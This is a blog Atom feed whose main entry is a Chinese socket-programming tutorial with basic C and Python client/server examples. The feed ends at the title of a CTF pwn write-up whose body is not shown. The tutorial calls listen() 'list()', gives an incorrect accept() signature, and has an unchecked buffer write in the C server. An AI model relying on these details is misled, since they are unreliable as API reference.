<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>nuoye</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://nuoye-blog.github.io/"/>
  <updated>2020-05-20T14:26:10.880Z</updated>
  <id>https://nuoye-blog.github.io/</id>
  
  <author>
    <name>nuoye</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>socket编程详解</title>
    <link href="https://nuoye-blog.github.io/2020/05/20/%E7%BC%96%E7%A8%8B/socket%E7%BC%96%E7%A8%8B%E8%AF%A6%E8%A7%A3/"/>
    <id>https://nuoye-blog.github.io/2020/05/20/%E7%BC%96%E7%A8%8B/socket%E7%BC%96%E7%A8%8B%E8%AF%A6%E8%A7%A3/</id>
    <published>2020-05-20T14:26:00.000Z</published>
    <updated>2020-05-20T14:26:10.880Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>网络进程标识：ip地址，协议，端口。</p><p>TCP/IP是传输控制协议/网间协议。</p><p>TCP/IP协议存在于OS中，网络服务通过OS提供，在OS中增加支持TCP/IP的系统调用。</p><p>Socket是应用层与TCP/IP协议族通信的中间软件抽象层，它是一组接口。</p><h2 id="Socket-API"><a href="#Socket-API" class="headerlink" title="Socket API"></a>Socket API</h2><h3 id="socket-函数"><a href="#socket-函数" class="headerlink" title="socket()函数"></a>socket()函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">socket</span><span class="params">(<span class="keyword">int</span> protofamily, <span class="keyword">int</span> typ, <span class="keyword">int</span> protocol)</span></span>; <span class="comment">//返回sockfd</span></span><br></pre></td></tr></table></figure><p>该函数用于创建一个socket描述符，它唯一标识一个socket。其中三个参数分别如下：</p><ul><li>protofamily：即协议域，又称为协议族（family）。常用的协议族有，AF_INET(IPV4)、AF_INET6(IPV6)、AF_LOCAL（或称AF_UNIX，Unix域socket）、AF_ROUTE等等。协议族决定了socket的地址类型，在通信中必须采用对应的地址，如AF_INET决定了要用ipv4地址（32位的）与端口号（16位的）的组合、AF_UNIX决定了要用一个绝对路径名作为地址。当其为0时，会自动选择type对应的默认协议。</li><li>type：指定socket类型。常用的socket类型有，SOCK_STREAM、SOCK_DGRAM、SOCK_RAW、SOCK_PACKET、SOCK_SEQPACKET等等。</li><li>protocol：顾名思意，就是指定协议。常用的协议有，IPPROTO_TCP、IPPTOTO_UDP、IPPROTO_SCTP、IPPROTO_TIPC等，它们分别对应TCP传输协议、UDP传输协议、STCP传输协议、TIPC传输协议。</li></ul><p>注：protofamily与type不可随意组合。</p><h3 id="bind-函数"><a href="#bind-函数" class="headerlink" title="bind()函数"></a>bind()函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bind</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">const</span> struct sockaddr *addr, <span class="keyword">socklen_t</span> addrlen)</span></span>;</span><br></pre></td></tr></table></figure><p>该函数用来把一个特定地址赋给sockfd，如127.0.0.1:80。若未用该函数直接connect()，list()时系统会随机分配一个端口号。</p><p>函数的三个参数分别为：</p><ul><li><p>sockfd：即socket描述字，它是通过socket()函数创建了，唯一标识一个socket。bind()函数就是将给这个描述字绑定一个名字。</p></li><li><p>addr：一个const struct sockaddr *指针，指向要绑定给sockfd的协议地址。这个地址结构根据地址创建socket时的地址协议族的不同而不同，如ipv4对应的是： </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> &#123;</span></span><br><span class="line">    <span class="keyword">sa_family_t</span>    sin_family; <span class="comment">/* address family: AF_INET */</span></span><br><span class="line">    <span class="keyword">in_port_t</span>      sin_port;   <span class="comment">/* port in network byte order */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> <span class="title">sin_addr</span>;</span>   <span class="comment">/* internet address */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Internet address. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span>       s_addr;     <span class="comment">/* address in network byte order */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ipv6对应的是： </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in6</span> &#123;</span> </span><br><span class="line">    <span class="keyword">sa_family_t</span>     sin6_family;   <span class="comment">/* AF_INET6 */</span> </span><br><span class="line">    <span class="keyword">in_port_t</span>       sin6_port;     <span class="comment">/* port number */</span> </span><br><span class="line">    <span class="keyword">uint32_t</span>        sin6_flowinfo; <span class="comment">/* IPv6 flow information */</span> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in6_addr</span> <span class="title">sin6_addr</span>;</span>     <span class="comment">/* IPv6 address */</span> </span><br><span class="line">    <span class="keyword">uint32_t</span>        sin6_scope_id; <span class="comment">/* Scope ID (new in 2.4) */</span> </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">in6_addr</span> &#123;</span> </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span>   s6_addr[<span class="number">16</span>];   <span class="comment">/* IPv6 address */</span> </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>Unix域对应的是： </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UNIX_PATH_MAX    108</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_un</span> &#123;</span> </span><br><span class="line">    <span class="keyword">sa_family_t</span> sun_family;               <span class="comment">/* AF_UNIX */</span> </span><br><span class="line">    <span class="keyword">char</span>        sun_path[UNIX_PATH_MAX];  <span class="comment">/* pathname */</span> </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p>addrlen：对应的是地址的长度。</p></li></ul><h3 id="list-、connect-函数"><a href="#list-、connect-函数" class="headerlink" title="list()、connect()函数"></a>list()、connect()函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">list</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">int</span> backlog)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">connect</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">const</span> struct sockaddr *addr, <span class="keyword">socklen_t</span> addrlen)</span></span>;</span><br></pre></td></tr></table></figure><p>list()函数用于服务器端侦听端口。</p><p>connect()函数用于客户端向服务器端发送连接请求。</p><h3 id="accept-函数"><a href="#accept-函数" class="headerlink" title="accept()函数"></a>accept()函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">accept</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">const</span> struct sockaddr *addr, <span class="keyword">socklen_t</span> addrlen)</span></span>;<span class="comment">//返回connect_fd</span></span><br></pre></td></tr></table></figure><p>该函数用于服务器端在list()之后接收请求，其中第二个参数addr用来接收返回值，返回值指向客户端地址。</p><p>注：accept默认会阻塞进程，直到有一个客户连接建立后返回。</p><h3 id="读写操作函数"><a href="#读写操作函数" class="headerlink" title="读写操作函数"></a>读写操作函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">read</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> count)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">write</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">const</span> <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> count)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">send</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">const</span> <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> len, <span class="keyword">int</span> flags)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">recv</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> len, <span class="keyword">int</span> flags)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">sendto</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">const</span> <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> len, <span class="keyword">int</span> flags, <span class="keyword">const</span> struct sockaddr *dest_addr, <span class="keyword">socklen_t</span> addrlen)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">recvfrom</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> len, <span class="keyword">int</span> flags, struct sockaddr *src_addr, <span class="keyword">socklen_t</span> *addrlen)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">sendmsg</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">const</span> struct msghdr *msg, <span class="keyword">int</span> flags)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">recvmsg</span><span class="params">(<span class="keyword">int</span> sockfd, struct msghdr *msg, <span class="keyword">int</span> flags)</span></span>;</span><br></pre></td></tr></table></figure><p>这些函数用于接收和发送数据，不一一介绍，具体看man文档。</p><h3 id="close-函数"><a href="#close-函数" class="headerlink" title="close()函数"></a>close()函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">close</span><span class="params">(<span class="keyword">int</span> fd)</span></span>;</span><br></pre></td></tr></table></figure><p>该函数用于关闭连接。</p><p>注：close操作只是使用相应socket描述字的引用计数减1，只有当引用计数为0时，才会触发TCP客户端向服务器发送终止连接请求。</p><h2 id="socket中TCP的建立"><a href="#socket中TCP的建立" class="headerlink" title="socket中TCP的建立"></a>socket中TCP的建立</h2><p>TCP协议通过三个报文段完成连接的建立，即三次握手：</p><ul><li>第一次握手：建立连接时，客户端发送syn包到服务器，并进入SYN_SEND状态，等待服务器确认。（SYN：同步序列编号）</li><li>第二次握手：服务器收到syn包，必须确认客户的SYN，同时自己也发送一个SYN包，即SYN+ACK包，此时服务器进入SYN_RECV状态。</li><li>第三次握手：客户端收到服务器的SYN+ACK包，向服务器发送确认包ACK，此包发送完毕，客户端和服务器进入ESTABLISHED状态，完成三次握手。</li></ul><h2 id="TCP连接的终止"><a href="#TCP连接的终止" class="headerlink" title="TCP连接的终止"></a>TCP连接的终止</h2><p>终止一个连接要经过四次握手，这是由TCP的半关闭造成的。</p><ol><li>客户端发送一个FIN，用来关闭客户端到服务器端的数据传送。</li><li>服务器端收到这个FIN，它发回一个ACK，确认序号为收到的序号加1。</li><li>服务器端关闭与客户端的连接，发送一个FIN给客户端。</li><li>客户端发回ACK报文确认，并将确认序号设置为收到序号加1。</li></ol><h2 id="socket编程实例"><a href="#socket编程实例" class="headerlink" title="socket编程实例"></a>socket编程实例</h2><h3 id="C"><a href="#C" class="headerlink" title="C"></a>C</h3><h4 id="服务器端"><a href="#服务器端" class="headerlink" title="服务器端"></a>服务器端</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFSIZE 4096</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> socket_fd, connect_fd;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">servaddr</span>;</span></span><br><span class="line"><span class="keyword">char</span> buf[BUFSIZE];</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">if</span>( (socket_fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>) ) == <span class="number">-1</span> )&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"create socket error: %s(errno: %d)\n"</span>,strerror(errno), errno);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(&amp;servaddr, <span class="number">0</span>, <span class="keyword">sizeof</span>(servaddr) );</span><br><span class="line">servaddr.sin_family = AF_INET;</span><br><span class="line">servaddr.sin_addr.s_addr = htonl(INADDR_ANY);</span><br><span class="line">servaddr.sin_port = htons(<span class="number">8000</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(bind(socket_fd, (struct sockaddr*)&amp;servaddr, <span class="keyword">sizeof</span>(servaddr)) == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"bind socket error: %s(errno: %d)\n"</span>,strerror(errno), errno);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">listen</span>(socket_fd, <span class="number">10</span>) == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"listen socket error: %s(errno: %d)\n"</span>,strerror(errno), errno);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"=====wait for connect====\n"</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>( (connect_fd = accept(socket_fd, (struct sockaddr*)<span class="literal">NULL</span>, <span class="literal">NULL</span>) ) == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"accept socket error: %s(errno: %d)\n"</span>,strerror(errno), errno);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">n = recv(connect_fd, buf, BUFSIZE, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!fork())&#123;</span><br><span class="line"><span class="keyword">if</span>(send(connect_fd, <span class="string">"Hello, you are connect"</span>, <span class="number">27</span>, <span class="number">0</span>) == <span class="number">-1</span>)</span><br><span class="line">perror(<span class="string">"send_error"</span>);</span><br><span class="line"><span class="built_in">close</span>(connect_fd);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">buf[n] = <span class="string">'\0'</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"you have recv msg: %s\n"</span>,buf);</span><br><span class="line"><span class="built_in">close</span>(connect_fd);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">close</span>(socket_fd);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFSIZE 4096</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> socket_fd, n, rec_len;</span><br><span class="line"><span class="keyword">char</span> sendline[BUFSIZE];</span><br><span class="line"><span class="keyword">char</span> buf[BUFSIZE];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">servaddr</span>;</span></span><br><span class="line"><span class="keyword">if</span>(argc &lt; <span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"usage: ./client &lt;ipaddress&gt;"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( (socket_fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>) ) &lt; <span class="number">0</span> )&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"create socket error: %s(errno: %d)\n"</span>, strerror(errno), errno);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(&amp;servaddr, <span class="number">0</span>, <span class="keyword">sizeof</span>(servaddr));</span><br><span class="line">servaddr.sin_family = AF_INET;</span><br><span class="line">servaddr.sin_port = htons(<span class="number">8000</span>);</span><br><span class="line"><span class="keyword">if</span>( inet_pton(AF_INET, argv[<span class="number">1</span>], &amp;servaddr.sin_addr) &lt;= <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"inet_pton error for %s\n"</span>, argv[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">connect</span>(socket_fd, (struct sockaddr*)&amp;servaddr, <span class="keyword">sizeof</span>(servaddr) ) &lt; <span class="number">0</span> )&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"connect socket error: %s(errno: %d)\n"</span>, strerror(errno), errno);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"send msg to server: \n"</span>);</span><br><span class="line">fgets(sendline, BUFSIZE, <span class="built_in">stdin</span>);</span><br><span class="line"><span class="keyword">if</span>(send(socket_fd, sendline, <span class="built_in">strlen</span>(sendline), <span class="number">0</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"send msg error:%s(errno: %d)\n"</span>, strerror(errno), errno);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( (rec_len = recv(socket_fd, buf, BUFSIZE, <span class="number">0</span>) ) == <span class="number">-1</span> )&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"recv msg error:%s(errno: %d)\n"</span>, strerror(errno), errno);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">buf[rec_len] = <span class="string">'\0'</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Recvived : %s\n"</span>, buf);</span><br><span class="line"><span class="built_in">close</span>(socket_fd);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><h4 id="服务器端-1"><a href="#服务器端-1" class="headerlink" title="服务器端"></a>服务器端</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">s = socket.socket()</span><br><span class="line">host = socket.gethostname()</span><br><span class="line">port = <span class="number">8000</span></span><br><span class="line">s.bind((host, port))</span><br><span class="line"></span><br><span class="line">s.listen(<span class="number">5</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">c,addr = s.accept()</span><br><span class="line"><span class="keyword">print</span> <span class="string">'address'</span>,addr</span><br><span class="line">msg = <span class="string">"welcome to my service. \nif you want to exit, please input exit."</span></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">c.send(msg)</span><br><span class="line">buf = c.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'exit'</span> <span class="keyword">in</span> buf:</span><br><span class="line">c.close()</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">msg = <span class="string">"you have input: "</span>+buf</span><br></pre></td></tr></table></figure><h4 id="客户端-1"><a href="#客户端-1" class="headerlink" title="客户端"></a>客户端</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">s = socket.socket()</span><br><span class="line">host = socket.gethostname()</span><br><span class="line">port = <span class="number">8000</span></span><br><span class="line">s.connect((host, port))</span><br><span class="line"><span class="keyword">print</span> s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">buf = sys.stdin.readline()</span><br><span class="line">s.send(buf)</span><br><span class="line"><span class="keyword">print</span> s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'exit'</span> <span class="keyword">in</span> buf:</span><br><span class="line">s.close()</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>Linux的SOCKET编程详解 - 江召伟 - 博客园  <a href="https://www.cnblogs.com/jiangzhaowei/p/8261174.html" target="_blank" rel="noopener">https://www.cnblogs.com/jiangzhaowei/p/8261174.html</a></p><p>Python 网络编程 | 菜鸟教程  <a href="https://www.runoob.com/python/python-socket.html" target="_blank" rel="noopener">https://www.runoob.com/python/python-socket.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前置知识&quot;&gt;&lt;a href=&quot;#前置知识&quot; class=&quot;headerlink&quot; title=&quot;前置知识&quot;&gt;&lt;/a&gt;前置知识&lt;/h2&gt;&lt;p&gt;网络进程标识：ip地址，协议，端口。&lt;/p&gt;
&lt;p&gt;TCP/IP是传输控制协议/网间协议。&lt;/p&gt;
&lt;p&gt;TCP/IP协议存
      
    
    </summary>
    
    
      <category term="编程" scheme="https://nuoye-blog.github.io/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="python" scheme="https://nuoye-blog.github.io/tags/python/"/>
    
      <category term="socket" scheme="https://nuoye-blog.github.io/tags/socket/"/>
    
      <category term="c" scheme="https://nuoye-blog.github.io/tags/c/"/>
    
      <category term="编程" scheme="https://nuoye-blog.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>2020网鼎青龙组pwn-wp</title>
    <link href="https://nuoye-blog.github.io/2020/05/19/wp/2020%E7%BD%91%E9%BC%8E%E9%9D%92%E9%BE%99%E7%BB%84/2020%E7%BD%91%E9%BC%8E%E9%9D%92%E9%BE%99%E7%BB%84pwn-wp/"/>
